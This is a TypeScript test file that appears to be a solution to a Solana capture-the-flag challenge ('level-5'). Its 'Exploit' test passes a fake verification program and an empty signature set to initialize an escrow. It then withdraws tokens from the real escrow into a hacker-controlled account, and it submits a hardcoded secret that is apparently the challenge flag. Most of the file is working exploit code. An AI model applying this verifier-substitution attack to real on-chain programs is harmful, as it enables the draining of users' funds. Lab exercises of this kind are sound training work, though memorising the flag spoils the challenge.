import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Level5 } from "../target/types/level_5";
import * as path from "path";
import * as fs from "fs";
import * as web3 from "@solana/web3.js";
import * as splToken from "@solana/spl-token";
import { assert } from "chai";

const MINT = new web3.PublicKey("AQgQFkAfMnqQQTPPb1AQGosYJBKQGBRWpEXYxNcyaxfk");
const ESCROW = new web3.PublicKey(
  "HbGCPDmCNGE5w2cVvCFjkGFNSdGx7uw9N3mBYTRcvK4Y"
);
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey(
  "HyyhVK1119SiWcHFjjjnE2L43NfFXjCBauBHiFEHu7to"
);
const GUARDIAN_SET = new web3.PublicKey(
  "59ihtd3wfXES7zz4MvPUKfjT5n7c4rTzfpCBu3vy2NYi"
);
const RECIPIENT_TOKEN_ACCOUNT = new web3.PublicKey(
  "6y3aq4nFpXU35JkQFbGnjoDtd5YivKtAT2p8j2ZBd6vy"
);
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey(
  "CEeQcvL8VRuufvRd3wrHN5x6RosztZD9pAosPDZW6H5t"
);
const VERIFICATION_PROGRAM = new web3.PublicKey(
  "BqK4ZHrKeJudWinT6SyQe76uLoighkr7uvmE4bHCrv1L"
);
const FAKE_VERIFICATION_PROGRAM = new web3.PublicKey(
  "kj3ZsZLEWbyemGEMECAyNkJNHesE6cBbYW2ru4Dr14z"
); //kj3ZsZLEWbyemGEMECAyNkJNHesE6cBbYW2ru4Dr14z

// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v

const SECRET =
  "8124bd6f515e61c03e782d521eea6cc9da7193bc158492e740a13a852e7d994d";

// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x

describe("level-5", () => {
  // Configure the client to use the local cluster.
  let provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");

  anchor.setProvider(provider);

  provider.connection.onLogs("all", (logs) => {
    console.log("Solana Program Logs:", logs);
  });

  const program = anchor.workspace.Level5 as Program<Level5>;

  const hacker = load_keypair("../accounts/hacker.json");

  let escrowPdaAuthority: any,
    hackerTokenAccount: any;


  before("Setup", async () => {
    await airdrop(
      provider.connection,
      hacker.publicKey,
      10 * anchor.web3.LAMPORTS_PER_SOL
    );

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync(
      [anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")],
      program.programId
    );

    //hackerTokenAccount = await splToken.createAccount(provider.connection, hacker, MINT, hacker.publicKey, undefined, undefined, splToken.TOKEN_PROGRAM_ID);
    hackerTokenAccount = await splToken.createAccount(
      provider.connection,
      hacker,
      MINT,
      hacker.publicKey,
      undefined,
      undefined,
      splToken.TOKEN_PROGRAM_ID
    );
  });

  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v

  it("Exploit ", async () => {
    const guardianSetIndex = 0;

    const [guardianSet] = web3.PublicKey.findProgramAddressSync(
      [
        anchor.utils.bytes.utf8.encode("guardian_set"),
        hacker.publicKey.toBuffer(),
        new anchor.BN(guardianSetIndex).toBuffer("be", 4),
      ],
      FAKE_VERIFICATION_PROGRAM
    );

    const escrowTokenAccount = web3.Keypair.generate();

    const [escrowPDA] = web3.PublicKey.findProgramAddressSync(
      [
        anchor.utils.bytes.utf8.encode("escrow"),
        hacker.publicKey.toBuffer(), // recipient
        hacker.publicKey.toBuffer(), // sender
        escrowTokenAccount.publicKey.toBuffer(), // escrow_token_account
      ],
      program.programId
    );
    const signaturesNumber = 0;
    const expirationTime = new anchor.BN(0);
    const signatures = []; 
    const amountIn = new anchor.BN(0);
    try {
      await program.methods
        .initialize(
          guardianSetIndex,
          signaturesNumber,
          expirationTime,
          signatures,
          amountIn
        )
        .accounts({
          sender: hacker.publicKey,
          recipient: hacker.publicKey,
          guardianSet: guardianSet,
          escrow: escrowPDA,
          escrowTokenAccount: escrowTokenAccount.publicKey,
          escrowPdaAuthority: escrowPdaAuthority,
          senderTokenAccount: hackerTokenAccount,
          mint: MINT,
          tokenProgram: splToken.TOKEN_PROGRAM_ID,
          systemProgram: web3.SystemProgram.programId,
          verificationProgram: FAKE_VERIFICATION_PROGRAM, 
        })
        .signers([hacker, escrowTokenAccount])
        .rpc();
    } catch (error) {
      console.log("Initiliaze", error);
    }

    console.log("4");
    await program.methods
      .withdraw([])
      .accounts({
        recipient: hacker.publicKey,
        recipientTokenAccount: hackerTokenAccount,
        guardianSet: guardianSet,
        escrow: ESCROW,
        escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
        escrowPdaAuthority: escrowPdaAuthority,
        mint: MINT,
        verificationProgram: FAKE_VERIFICATION_PROGRAM,
        tokenProgram: splToken.TOKEN_PROGRAM_ID,
        systemProgram: web3.SystemProgram.programId,
        associatedTokenProgram: splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
      })
      .signers([hacker])
      .rpc();
  });
  // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE ABOVE
  // | | | | | | | | | | | | | | | | | | | | |
  // x x x x x x x x x x x x x x x x x x x x x

  it("Secret", async () => {
    await program.methods
      .obtainSecret(SECRET)
      .accounts({
        hacker: hacker.publicKey,
        hackerAta: hackerTokenAccount,
        mint: MINT,
      })
      .signers([hacker])
      .rpc();
  });
});

async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    "confirmed"
  );
}

function load_keypair(name: string): anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData));
}
